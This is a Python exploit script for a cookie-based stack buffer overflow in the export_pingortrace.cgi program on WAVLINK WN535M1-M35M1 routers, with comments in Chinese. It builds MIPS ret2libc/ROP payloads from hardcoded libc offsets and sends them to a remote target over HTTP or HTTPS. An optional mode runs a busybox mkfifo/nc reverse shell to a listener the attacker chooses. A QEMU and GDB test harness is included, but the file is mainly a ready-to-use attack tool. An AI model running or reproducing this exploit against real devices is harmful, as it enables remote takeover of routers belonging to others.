#!/usr/bin/env python3
"""
WAVLINK WN535M1-M35M1 Stack Buffer Overflow → RCE / Reverse Shell
漏洞: export_pingortrace.cgi → strcpy(v10[256], getenv("HTTP_COOKIE"))
架构: MIPS32 LE, NX, musl libc, ret2libc + ROP

用法:
  # 方案 A: system("/bin/sh") 验证 (GDB)
  python wavlink_stackoverflow_rce.py --qemu --gdb

  # 方案 B: 自定义命令
  python wavlink_stackoverflow_rce.py --qemu --cmd "id>/tmp/pwned"

  # 反弹 shell (先在本机 nc -lvp 4444)
  python wavlink_stackoverflow_rce.py --revshell 192.168.2.1 4444 --target 192.168.2.128:9999

  # 仅打印 payload
  python wavlink_stackoverflow_rce.py --dump
  python wavlink_stackoverflow_rce.py --dump --cmd "id>/tmp/pwned"
  python wavlink_stackoverflow_rce.py --dump --revshell 192.168.2.1 4444
"""

import struct, sys, argparse, os

# ==================== 利用参数 ====================

LIBC_BASE   = 0x3ff5b000
SYSTEM_OFF  = 0x5a3f8
BINSH_OFF   = 0x8fab8
GADGET_A_OFF = 0x26cb8   # move $t9,$s2; jalr $t9; move $a0,$s0
GADGET_B_OFF = 0x4c0fc   # lw $a0,0x1c($sp); move $t9,$s1; jalr $t9

SYSTEM_ADDR  = LIBC_BASE + SYSTEM_OFF
BINSH_ADDR   = LIBC_BASE + BINSH_OFF
GADGET_A     = LIBC_BASE + GADGET_A_OFF
GADGET_B     = LIBC_BASE + GADGET_B_OFF

S0_OFF = 304
CGI_PATH = "/export_pingortrace.cgi"

# QEMU user-mode 栈地址校准表 (cookie_length → sp_at_epilog)
# cgi_server.py 用固定最小 env (5 vars), sp 确定性可复现
SP_CALIBRATION = {
    414: 0x408006c8,   # approach B, 62-byte cmd (revshell/padded)
    415: 0x408006c8,   # approach B, 63-byte cmd (sh -i revshell), 已验证
}

def estimate_sp(cookie_len):
    """根据 cookie 长度查表或线性外推"""
    if cookie_len in SP_CALIBRATION:
        return SP_CALIBRATION[cookie_len]
    ref_len, ref_sp = 414, 0x408006c8
    delta = cookie_len - ref_len
    return ref_sp - int(delta * 80 / 94)


def pack32(val):
    return struct.pack("<I", val)

def check_null(data, label="payload"):
    for i, b in enumerate(data):
        if b == 0:
            print("[!] NULL byte @ %s[%d]!" % (label, i))
            return False
    return True


def build_payload_a():
    """方案 A: system("/bin/sh") — 用 libc 内置字符串, 不需要栈地址"""
    prefix = b"token=" + b"A" * 32
    pad    = b"X" * (S0_OFF - len(prefix))
    s0 = pack32(BINSH_ADDR)
    s1 = pack32(0x42424242)
    s2 = pack32(SYSTEM_ADDR)
    ra = pack32(GADGET_A)
    cookie = prefix + pad + s0 + s1 + s2 + ra
    check_null(cookie)
    return cookie, 'system("/bin/sh")'


def build_payload_b(cmd_str, sp_override=None):
    """方案 B: 栈上自定义命令 — 需要校准的栈地址"""
    cmd = cmd_str.encode("ascii") if isinstance(cmd_str, str) else cmd_str
    if not check_null(cmd, "command"):
        sys.exit(1)

    # 填充命令到已校准长度 (414=352+62), shell 忽略尾部 ";#xx"
    raw_total = 352 + len(cmd)
    calibrated_lengths = sorted(SP_CALIBRATION.keys())
    for cl in calibrated_lengths:
        if cl >= raw_total:
            pad_need = cl - raw_total
            if pad_need > 0:
                cmd = cmd + b";" + b"#" * (pad_need - 1)
            break

    total_len = 352 + len(cmd)
    sp = sp_override if sp_override else estimate_sp(total_len)
    new_sp = sp + 0x560
    cmd_addr = new_sp + 0x20

    if not check_null(pack32(cmd_addr), "cmd_addr") or not check_null(pack32(GADGET_B), "gadget_b"):
        sys.exit(1)

    prefix = b"token=" + b"A" * 32
    pad    = b"X" * (S0_OFF - len(prefix))
    s0 = pack32(0x41414141)
    s1 = pack32(SYSTEM_ADDR)
    s2 = pack32(0x43434343)
    ra = pack32(GADGET_B)
    stack_pad = b"Y" * 28
    cmd_ptr   = pack32(cmd_addr)
    cookie = prefix + pad + s0 + s1 + s2 + ra + stack_pad + cmd_ptr + cmd

    if not check_null(cookie):
        sys.exit(1)

    return cookie, 'system("%s")' % cmd.decode(), sp, new_sp, cmd_addr


def print_info(cookie, desc, extra=None):
    print("=" * 64)
    print("  WAVLINK WN535M1 Stack Overflow RCE")
    print("=" * 64)
    print("  Chain: %s" % desc)
    print("  Cookie: %d bytes" % len(cookie))

    if len(cookie) >= 320:
        s0 = struct.unpack_from("<I", cookie, S0_OFF)[0]
        s1 = struct.unpack_from("<I", cookie, 308)[0]
        s2 = struct.unpack_from("<I", cookie, 312)[0]
        ra = struct.unpack_from("<I", cookie, 316)[0]
        print("  s0=0x%08x  s1=0x%08x  s2=0x%08x  ra=0x%08x" % (s0, s1, s2, ra))

    if extra:
        for k, v in extra.items():
            print("  %s: 0x%08x" % (k, v))
    print()


def dump_hex(cookie):
    for i in range(0, len(cookie), 32):
        chunk = cookie[i:i+32]
        h = " ".join("%02x" % b for b in chunk)
        a = "".join(chr(b) if 0x20 <= b < 0x7f else "." for b in chunk)
        print("  %04x: %-96s %s" % (i, h, a))


def send_exploit(cookie, target, use_https=False):
    """通过 HTTP/HTTPS 发送 exploit cookie 到目标"""
    import requests, urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    scheme = "https" if use_https else "http"
    url = "%s://%s%s" % (scheme, target, CGI_PATH)
    headers = {
        "Cookie": cookie.decode("latin-1"),
        "User-Agent": "Mozilla/5.0",
        "Referer": "%s://%s/" % (scheme, target.split(":")[0]),
    }
    print("[*] Sending exploit -> %s" % url)
    try:
        r = requests.get(url, headers=headers, timeout=10, verify=False)
        print("[*] HTTP %d (%d bytes)" % (r.status_code, len(r.content)))
    except requests.exceptions.ConnectionError:
        print("[!] Connection reset - CGI crashed (exploit likely triggered)")
    except requests.exceptions.Timeout:
        print("[!] Timeout - command may be executing (reverse shell?)")
    except Exception as e:
        print("[-] Error: %s" % e)


def main():
    p = argparse.ArgumentParser(
        description="WAVLINK WN535M1 Stack Overflow RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter)

    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("--dump", action="store_true", help="Print payload hex")
    mode.add_argument("--qemu", action="store_true", help="QEMU local test")
    mode.add_argument("--target", type=str, help="Remote target IP[:PORT]")

    p.add_argument("--gdb", action="store_true", help="GDB verify (with --qemu)")
    p.add_argument("--cmd", type=str, help="Custom command (approach B)")
    p.add_argument("--revshell", nargs=2, metavar=("LHOST", "LPORT"),
                   help="Reverse shell: LHOST LPORT (busybox mkfifo+nc)")
    p.add_argument("--sp", type=lambda x: int(x, 0),
                   help="Override sp_at_epilog (hex, e.g. 0x408003c8)")
    p.add_argument("--https", action="store_true",
                   help="Use HTTPS (skip cert verify, for self-signed)")

    args = p.parse_args()

    # Determine command
    if args.revshell:
        lhost, lport = args.revshell
        cmd = "rm /tmp/f;mkfifo /tmp/f;sh -i</tmp/f|nc %s %s>/tmp/f" % (lhost, lport)
        print("[*] Reverse shell -> %s:%s" % (lhost, lport))
        print("[!] Start listener first:  nc -lvp %s" % lport)
        print()
    elif args.cmd:
        cmd = args.cmd
    else:
        cmd = None

    # Build payload
    if cmd is None:
        cookie, desc = build_payload_a()
        extra = None
    else:
        result = build_payload_b(cmd, sp_override=args.sp)
        cookie, desc, sp, new_sp, cmd_addr = result
        extra = {"sp_at_epilog": sp, "new_sp": new_sp, "cmd_addr": cmd_addr}

    print_info(cookie, desc, extra)

    # Execute
    if args.dump:
        dump_hex(cookie)

    elif args.qemu:
        import subprocess, time

        rootfs = os.environ.get("ROOTFS",
            "/home/iotsec-zone/Desktop/extract/"
            "_WAVLINK_WN535M1-M35M1_V250922-WO-GD.bin-0.extracted/squashfs-root")
        cgi = b"./etc/lighttpd/www/cgi-bin/export_pingortrace.cgi"

        subprocess.run(["pkill", "-9", "-f", "qemu.*12399"], capture_output=True)
        time.sleep(0.5)

        env = dict(os.environb)
        env[b"HTTP_COOKIE"] = cookie
        env[b"HTTP_REFERER"] = b"http://test"
        os.chdir(rootfs)

        if args.gdb:
            print("[*] QEMU + GDB mode (gdbstub :12399)")
            qemu = subprocess.Popen(
                [b"qemu-mipsel-static", b"-g", b"12399", b"-L", b".", cgi],
                stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                env=env)
            time.sleep(1)

            gdb_cmds = (
                "set architecture mips\nset endian little\n"
                "target remote :12399\nbreak *0x400c68\ncontinue\n"
                "info registers s0 s1 s2 ra\n"
                "break *0x%x\ncontinue\n"
                "info registers a0 t9 pc\nx/s $a0\nquit\n"
            ) % SYSTEM_ADDR

            with open("/tmp/rce.gdb", "w") as f:
                f.write(gdb_cmds)

            result = subprocess.run(
                ["gdb-multiarch", "-batch", "-x", "/tmp/rce.gdb"],
                capture_output=True, text=True, timeout=20)
            print(result.stdout)
            qemu.kill()
        else:
            print("[*] QEMU execute mode")
            qemu = subprocess.Popen(
                [b"qemu-mipsel-static", b"-L", b".", cgi],
                stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                env=env)
            try:
                out, err = qemu.communicate(timeout=8)
            except subprocess.TimeoutExpired:
                qemu.kill()
                out, err = qemu.communicate()
            print("[*] Exit: %s" % qemu.returncode)

    elif args.target:
        args.target = args.target.replace("https://", "").replace("http://", "").rstrip("/")
        if ":" not in args.target:
            args.target += ":443" if args.https else ":80"
        send_exploit(cookie, args.target, use_https=args.https)


if __name__ == "__main__":
    main()
